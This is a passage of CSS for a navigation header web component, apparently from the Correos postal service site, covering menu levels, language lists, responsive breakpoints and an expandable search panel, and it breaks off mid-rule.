		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-first-item.sc-correos-cdk-core-header .cdk-nav-lv-first-item-arrow.sc-correos-cdk-core-header {
			margin-left: auto
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-common-item.sc-correos-cdk-core-header {
			width: 100%;
			-webkit-box-sizing: border-box;
			box-sizing: border-box
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-common-item.sc-correos-cdk-core-header {
				padding: 0 1.5rem 0 0
			}
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-common-item.sc-correos-cdk-core-header>a.sc-correos-cdk-core-header,
		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-common-item.sc-correos-cdk-core-header>button.sc-correos-cdk-core-header {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-align: center;
			align-items: center;
			height: 100%;
			width: 100%;
			padding: 8px 0 8px 0
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-common-item.--active.sc-correos-cdk-core-header .cdk-nav-lv-first-item-text.sc-correos-cdk-core-header {
			font-weight: bold
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-common-item.--with-border.sc-correos-cdk-core-header>a.sc-correos-cdk-core-header,
		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-common-item.--with-border.sc-correos-cdk-core-header>button.sc-correos-cdk-core-header {
			border-bottom: 1px solid rgba(128, 128, 128, 0.5)
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-common-item.--first-shared.sc-correos-cdk-core-header {
			margin-top: 1.5rem
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-common-item.sc-correos-cdk-core-header .cdk-nav-lv-first-item-text.sc-correos-cdk-core-header {
			font-weight: bold;
			font-size: 0.875rem;
			line-height: 1.375rem;
			text-align: left
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-common-item.sc-correos-cdk-core-header .cdk-nav-lv-first-item-text.sc-correos-cdk-core-header {
				font-size: 1rem;
				line-height: 1.5rem
			}
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-common-item.sc-correos-cdk-core-header .cdk-nav-lv-first-item-text.sc-correos-cdk-core-header:hover {
			text-decoration: underline
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-common-item.sc-correos-cdk-core-header .cdk-nav-lv-first-item-icon.sc-correos-cdk-core-header {
			margin-right: 1rem
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-common-item.sc-correos-cdk-core-header .cdk-nav-lv-first-item-arrow.sc-correos-cdk-core-header {
			margin-left: auto
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-langs.sc-correos-cdk-core-header {
			margin-top: auto;
			font-weight: 300;
			-webkit-box-sizing: border-box;
			box-sizing: border-box
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-langs.sc-correos-cdk-core-header {
				padding: 0
			}
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-langs.sc-correos-cdk-core-header .cdk-nav-langs-title.sc-correos-cdk-core-header {
			display: block;
			font-size: 0.875rem;
			line-height: 1.375rem;
			margin-bottom: 0.5rem;
			font-size: 12px
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-langs.sc-correos-cdk-core-header .cdk-nav-langs-title.sc-correos-cdk-core-header {
				font-size: 1rem;
				line-height: 1.5rem
			}
		}

		@media (min-width: 640px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-langs.sc-correos-cdk-core-header .cdk-nav-langs-title.sc-correos-cdk-core-header {
				font-size: 14px
			}
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-langs.sc-correos-cdk-core-header .cdk-nav-langs-list.sc-correos-cdk-core-header {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-wrap: wrap;
			flex-wrap: wrap
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-langs.sc-correos-cdk-core-header .cdk-nav-langs-list.sc-correos-cdk-core-header .cdk-nav-langs-item.sc-correos-cdk-core-header {
			padding-right: 0.75rem;
			-ms-flex-wrap: wrap;
			flex-wrap: wrap
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-langs.sc-correos-cdk-core-header .cdk-nav-langs-list.sc-correos-cdk-core-header .cdk-nav-langs-item.sc-correos-cdk-core-header>a.sc-correos-cdk-core-header:hover {
			text-decoration: underline
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-langs.sc-correos-cdk-core-header .cdk-nav-langs-list.sc-correos-cdk-core-header .cdk-nav-langs-item.--title.sc-correos-cdk-core-header {
			font-weight: bold
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-second-toolbar.sc-correos-cdk-core-header {
			margin-left: auto;
			margin-right: auto;
			height: 2.5rem;
			-ms-flex: 0 0 auto;
			flex: 0 0 auto;
			display: -ms-flexbox;
			display: flex;
			-ms-flex-align: center;
			align-items: center;
			top: 6%
		}

		@media (min-width: 640px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-second-toolbar.sc-correos-cdk-core-header {
				display: none
			}
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-second-toolbar.sc-correos-cdk-core-header {
				margin-bottom: 1.5rem;
				visibility: hidden;
				pointer-events: none
			}
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-second-goback.sc-correos-cdk-core-header {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-align: center;
			align-items: center;
			font-weight: 300;
			position: relative;
			left: -0.5rem;
			font-weight: bold;
			text-transform: uppercase;
			font-size: 0.875rem;
			line-height: 1.375rem
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-second-goback.sc-correos-cdk-core-header {
				font-size: 1rem;
				line-height: 1.5rem
			}
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-second-goback.sc-correos-cdk-core-header>i.sc-correos-cdk-core-header {
			margin-right: 0.5rem;
			-webkit-transform: rotate(180deg);
			transform: rotate(180deg)
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-second-title.sc-correos-cdk-core-header {
			-ms-flex: 0 0 auto;
			flex: 0 0 auto;
			display: -ms-flexbox;
			display: flex;
			-ms-flex-align: center;
			align-items: center;
			-ms-flex-pack: justify;
			justify-content: space-between;
			margin: 16px auto -1px;
			height: 3.5rem;
			font-size: 1.125rem;
			line-height: 1.625rem;
			font-weight: bold;
			border-bottom: var(--_cdk-core-header-border-subpanel)
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-second-title.sc-correos-cdk-core-header {
				font-size: 1.5rem;
				line-height: 2.25rem
			}
		}

		@media (min-width: 640px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-second-title.sc-correos-cdk-core-header {
				margin: 32px auto -1px
			}
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-second-title.sc-correos-cdk-core-header {
				margin: 64px auto -1px
			}
		}

		@media (min-width: 640px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-second-title.sc-correos-cdk-core-header .cdk-nav-lv-title-icon.sc-correos-cdk-core-header {
				display: none
			}
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-second-title.sc-correos-cdk-core-header .cdk-nav-lv-title-icon.sc-correos-cdk-core-header {
				display: block
			}
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header a.cdk-nav-lv-second-title.sc-correos-cdk-core-header:hover span.sc-correos-cdk-core-header {
			text-decoration: underline
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-second-columns.sc-correos-cdk-core-header {
			width: 100%
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-second-columns.sc-correos-cdk-core-header {
				min-width: 240px
			}
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-second-columns.sc-correos-cdk-core-header .cdk-nav-lv-second-column.sc-correos-cdk-core-header {
			border-top: var(--_cdk-core-header-border-subpanel);
			width: auto
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-second-columns.sc-correos-cdk-core-header .cdk-nav-lv-second-column.sc-correos-cdk-core-header .cdk-nav-lv-third.sc-correos-cdk-core-header {
			display: -ms-flexbox;
			display: flex;
			padding-top: 0.75rem;
			padding-bottom: 0.75rem;
			font-weight: lighter
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-second-columns.sc-correos-cdk-core-header .cdk-nav-lv-second-column.sc-correos-cdk-core-header .cdk-nav-lv-third.sc-correos-cdk-core-header {
				padding-top: 0.75rem;
				padding-bottom: 0.75rem
			}
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-second-columns.sc-correos-cdk-core-header .cdk-nav-lv-second-column.sc-correos-cdk-core-header .cdk-nav-lv-third.sc-correos-cdk-core-header a.sc-correos-cdk-core-header:hover {
			text-decoration: underline
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-second-columns.sc-correos-cdk-core-header .cdk-nav-lv-second-column.sc-correos-cdk-core-header .cdk-nav-lv-third.--title.sc-correos-cdk-core-header {
			font-weight: bold
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-second-columns.sc-correos-cdk-core-header .cdk-nav-lv-second-column.sc-correos-cdk-core-header .cdk-nav-lv-third.sc-correos-cdk-core-header .cdk-nav-lv-second-item-arrow.sc-correos-cdk-core-header {
			margin-left: auto
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-second-columns.sc-correos-cdk-core-header .cdk-nav-lv-second-column.sc-correos-cdk-core-header a.cdk-nav-lv-third.--title.sc-correos-cdk-core-header:hover span.sc-correos-cdk-core-header {
			text-decoration: underline
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .ps--active-y.sc-correos-cdk-core-header .cdk-nav-page.--lv-second.sc-correos-cdk-core-header {
			height: auto
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-content-click-outside.sc-correos-cdk-core-header {
			display: none;
			-ms-flex: 1 1 auto;
			flex: 1 1 auto
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-content-click-outside.sc-correos-cdk-core-header {
				display: block
			}
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-overlay.sc-correos-cdk-core-header {
			position: absolute;
			opacity: 0;
			cursor: pointer;
			background-color: rgba(0, 0, 0, 0.4);
			top: 0;
			bottom: 0;
			left: 0;
			right: 0;
			width: 100%;
			height: 100%;
			display: none
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-overlay.sc-correos-cdk-core-header {
				-webkit-transition: opacity 0.15s linear;
				transition: opacity 0.15s linear;
				display: block
			}
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav-lv-settings.sc-correos-cdk-core-header .cdk-nav-lv-first-button.sc-correos-cdk-core-header {
			width: 100%;
			display: -ms-flexbox;
			display: flex;
			-ms-flex-align: center;
			align-items: center
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav-lv-settings.sc-correos-cdk-core-header .cdk-nav-lv-first-span.sc-correos-cdk-core-header {
			display: none
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav-lv-settings.sc-correos-cdk-core-header .cdk-nav-lv-first-div.sc-correos-cdk-core-header {
			height: 48px;
			-ms-flex-align: center;
			align-items: center;
			display: -ms-flexbox;
			display: flex
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav-lv-settings-list.sc-correos-cdk-core-header {
			display: none
		}

		@media (min-width: 640px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav-lv-settings-list.sc-correos-cdk-core-header {
				display: none
			}
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav-lv-settings-list.sc-correos-cdk-core-header {
				display: none
			}
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav-lv-settings-list.sc-correos-cdk-core-header .cdk-nav-lv-settings-li.sc-correos-cdk-core-header {
			-ms-flex-align: center;
			align-items: center;
			height: 48px;
			display: -ms-flexbox;
			display: flex
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav-lv-settings-list.sc-correos-cdk-core-header .cdk-nav-lv-settings-li.sc-correos-cdk-core-header .cdk-nav-lv-third.sc-correos-cdk-core-header {
			font-size: 0.875rem;
			line-height: 1.375rem;
			-ms-flex-align: center;
			align-items: center;
			display: -ms-flexbox;
			display: flex
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav-lv-settings-list.sc-correos-cdk-core-header .cdk-nav-lv-settings-li.sc-correos-cdk-core-header .cdk-nav-lv-third.sc-correos-cdk-core-header {
				font-size: 1rem;
				line-height: 1.5rem
			}
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav-lv-settings-list.sc-correos-cdk-core-header .cdk-nav-lv-settings-li.sc-correos-cdk-core-header .cdk-nav-lv-third.sc-correos-cdk-core-header .cdk-nav-lv-settings-img.sc-correos-cdk-core-header {
			width: 24px;
			margin-left: 24px;
			margin-right: 16px
		}

		[variant=portalname].sc-correos-cdk-core-header-h .cdk-header-title--blue.sc-correos-cdk-core-header {
			color: var(--theme-color-blue)
		}

		[variant=portalname].sc-correos-cdk-core-header-h .cdk-nav-page.--lv-first.sc-correos-cdk-core-header {
			background-color: white
		}

		[variant=portalname].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header {
			height: var(--_height-large)
		}

		@media (min-width: 1024px) {
			[variant=portalname].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header {
				height: var(--_height-portalname)
			}
		}

		@media (min-width: 1024px) {
			[variant=portalname].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-langs--margin-top.sc-correos-cdk-core-header {
				margin-top: 28px
			}
		}

		@media (max-width: 639px) {
			[variant=portalname].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-langs--margin-top.sc-correos-cdk-core-header {
				margin-top: 10px
			}
		}

		[variant=portalname].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header-logo-container.sc-correos-cdk-core-header {
			min-width: -webkit-max-content;
			min-width: -moz-max-content;
			min-width: max-content;
			width: -webkit-max-content;
			width: -moz-max-content;
			width: max-content
		}

		[variant=portalname].sc-correos-cdk-core-header-h .cdk-expand-search.sc-correos-cdk-core-header {
			position: absolute;
			left: 0;
			right: 0;
			z-index: 16;
			background-color: white;
			top: var(--cdk-core-header-height-large);
			height: calc(100% - var(--cdk-core-header-height-large));
			display: -ms-flexbox;
			display: flex;
			-ms-flex-direction: column;
			flex-direction: column;
			border-top: 1px solid #cbcbcb
		}

		[variant=portalname].sc-correos-cdk-core-header-h .cdk-expand-search__close.sc-correos-cdk-core-header {
			width: 100%;
			display: -ms-flexbox;
			display: flex;
			place-content: flex-end;
			padding-top: 10px;
			padding-left: calc(0.7rem + var(--_cdk-core-header-wrapper-gutters));
			padding-right: calc(0.7rem +var(--_cdk-core-header-wrapper-gutters));
			height: 50px
		}

		@media (min-width: 1024px) {
			[variant=portalname].sc-correos-cdk-core-header-h .cdk-expand-search__close.sc-correos-cdk-core-header {
				padding-left: calc(1rem + var(--_cdk-core-header-wrapper-gutters));
				padding-right: calc(1rem +var(--_cdk-core-header-wrapper-gutters))
			}
		}

		[variant=portalname].sc-correos-cdk-core-header-h .cdk-expand-search__close.sc-correos-cdk-core-header i.sc-correos-cdk-core-header:hover {
			cursor: pointer
		}

		[variant=portalname].sc-correos-cdk-core-header-h .cdk-expand-search__content.sc-correos-cdk-core-header {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-direction: column;
			flex-direction: column;
			place-content: center;
			-ms-flex-item-align: center;
			align-self: center
		}

		[variant=portalname].sc-correos-cdk-core-header-h .cdk-expand-search__content.sc-correos-cdk-core-header .cdk-header-input-search.sc-correos-cdk-core-header {
			width: 100%;
			margin-bottom: 24px
		}

		[variant=portalname].sc-correos-cdk-core-header-h .cdk-expand-search__image.sc-correos-cdk-core-header {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-item-align: center;
			align-self: center;
			max-height: 283px;
			max-width: 364px
		}

		[variant=portalname].sc-correos-cdk-core-header-h .cdk-expand-search__image.sc-correos-cdk-core-header img.sc-correos-cdk-core-header {
			max-width: 100%;
			max-height: 100%
		}

		@media (max-width: 639px) {
			[variant=portalname].sc-correos-cdk-core-header-h .cdk-expand-search__image.sc-correos-cdk-core-header {
				max-height: 159px;
				max-width: 205px
			}
		}

		[variant=portalname].sc-correos-cdk-core-header-h .cdk-expand-search__description.sc-correos-cdk-core-header {
			font-size: 1.75rem;
			line-height: 2.625rem;
			margin: 24px 0;
			text-align: center;
			color: #002e6d
		}

		@media (min-width: 1024px) {
			[variant=portalname].sc-correos-cdk-core-header-h .cdk-expand-search__description.sc-correos-cdk-core-header {
				font-size: 2.5rem;
				line-height: 3.5rem
			}
		}

		[variant=portalname].sc-correos-cdk-core-header-h .cdk-expand-search.sc-correos-cdk-core-header correos-ui-input.sc-correos-cdk-core-header {
			-ms-flex-item-align: center;
			align-self: center
		}

		@media (max-width: 639px) {
			[variant=portalname].sc-correos-cdk-core-header-h .cdk-expand-search.sc-correos-cdk-core-header correos-ui-input.sc-correos-cdk-core-header {
